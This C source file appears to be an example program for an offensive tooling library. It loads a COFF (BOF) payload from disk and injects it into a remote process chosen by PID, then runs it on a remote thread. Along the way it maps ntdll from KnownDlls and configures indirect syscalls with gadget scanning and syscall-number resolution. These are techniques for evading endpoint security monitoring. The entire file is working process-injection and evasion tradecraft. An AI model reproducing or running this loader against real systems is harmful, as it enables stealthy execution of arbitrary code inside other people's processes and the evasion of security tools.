#include <sindri.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static void print_usage(const char *program_name, FILE *stream) {
    fprintf(stream,
            "Usage:\n"
            "  %s -f <payload_path> -p <target_pid> [-e <entry_point>] [-a <args>]\n\n"
            "Options:\n"
            "  -f <payload_path>   Path to the COFF payload (.obj).\n"
            "  -p <target_pid>     Process ID of the remote target process.\n"
            "  -e <entry_point>    Name of the entry point function to execute (default: 'go').\n"
            "  -a <args>           Arguments string to pass to the BOF.\n\n"
            "Notes:\n"
            "  - The loader maps and links the image locally, then resolves it based on the remote execution base.\n"
            "  - A remote thread is created to invoke the payload.\n",
            program_name);
}

int main(int argc, char *argv[]) {
    const char *file_path   = NULL;
    const char *entry_name  = "go";
    char       *bof_args    = NULL;
    int         bof_arg_len = 0;
    DWORD       target_pid  = 0;

    for (int i = 1; i < argc; i++) {
        if ((strcmp(argv[i], "-h") == 0) || (strcmp(argv[i], "--help") == 0)) {
            print_usage(argv[0], stdout);
            return SND_SUCCESS;
        }
        if (strcmp(argv[i], "-f") == 0) {
            if (i + 1 >= argc) {
                fprintf(stderr, "[-] Missing value for -f.\n");
                print_usage(argv[0], stderr);
                return SND_STATUS_MISSING_COMMAND_LINE_ARGS;
            }
            file_path = argv[++i];
            continue;
        }
        if (strcmp(argv[i], "-p") == 0) {
            if (i + 1 >= argc) {
                fprintf(stderr, "[-] Missing value for -p.\n");
                print_usage(argv[0], stderr);
                return SND_STATUS_MISSING_COMMAND_LINE_ARGS;
            }
            target_pid = (DWORD)strtoul(argv[++i], NULL, 0);
            continue;
        }
        if (strcmp(argv[i], "-e") == 0) {
            if (i + 1 >= argc) {
                fprintf(stderr, "[-] Missing value for -e.\n");
                print_usage(argv[0], stderr);
                return SND_STATUS_MISSING_COMMAND_LINE_ARGS;
            }
            entry_name = argv[++i];
            continue;
        }
        if (strcmp(argv[i], "-a") == 0) {
            if (i + 1 >= argc) {
                fprintf(stderr, "[-] Missing value for -a.\n");
                print_usage(argv[0], stderr);
                return SND_STATUS_MISSING_COMMAND_LINE_ARGS;
            }
            bof_args    = argv[++i];
            bof_arg_len = (int)strlen(bof_args) + 1;
            continue;
        }
        fprintf(stderr, "[-] Unknown argument: %s\n", argv[i]);
        print_usage(argv[0], stderr);
        return SND_STATUS_INVALID_COMMAND_LINE_ARG;
    }

    if (file_path == NULL || target_pid == 0) {
        fprintf(stderr, "[-] Both -f <payload_path> and -p <target_pid> are required.\n");
        print_usage(argv[0], stderr);
        return SND_STATUS_MISSING_COMMAND_LINE_ARGS;
    }

    snd_status_t       status;
    snd_buffer_t       file_buf = {0};
    snd_ldr_coff_ctx_t ldr_ctx  = {0};
    snd_inj_ctx_t      inj_ctx  = {0};

    printf("[*] Loading COFF payload from disk: %s\n", file_path);
    status = snd_disk_buffer_load(file_path, &file_buf);
    if (SND_FAILED(status)) {
        goto cleanup;
    }

    PVOID ntdll;
    status = snd_om_knowndll_map(&snd_map_nt, L"ntdll.dll", &ntdll);
    if (SND_FAILED(status)) {
        goto cleanup;
    }
    snd_syscall_set_ntdll(ntdll);
    snd_syscall_set_invoker(snd_syscall_indirect_invoke_asm);
    snd_syscall_set_gadget_finder(snd_syscall_find_gadget_scan);

    /* Configure the cascading syscall resolution strategy. */
    snd_syscall_set_resolver(snd_syscall_resolve_ssn_scan);
    snd_syscall_add_resolver(snd_syscall_resolve_ssn_sort);

    ldr_ctx.mem_api    = &snd_mem_sys;
    ldr_ctx.mod_api    = &snd_mod_nt;
    ldr_ctx.raw_source = &file_buf;

    inj_ctx.target_pid = target_pid;
    inj_ctx.proc_api   = &snd_proc_nt;

    printf("[*] Firing high-level COFF injection chain...\n");

    status = snd_inj_classic_coff(&ldr_ctx, &inj_ctx, entry_name, bof_args, bof_arg_len);

    if (SND_SUCCEEDED(status)) {
        printf("[+] High-level chain completed successfully!\n");

        if (inj_ctx.remote_thread) {
            printf("[*] Waiting for remote thread to complete...\n");
            printf("[+] Remote thread finished.\n");
        }
    }

cleanup:
    snd_inj_cleanup(&inj_ctx);
    snd_ldr_coff_free_mapped_image(&ldr_ctx);
    snd_buffer_free(&file_buf);

    if (SND_FAILED(status)) {
        snd_status_print(status);
    }

    return status.code;
}
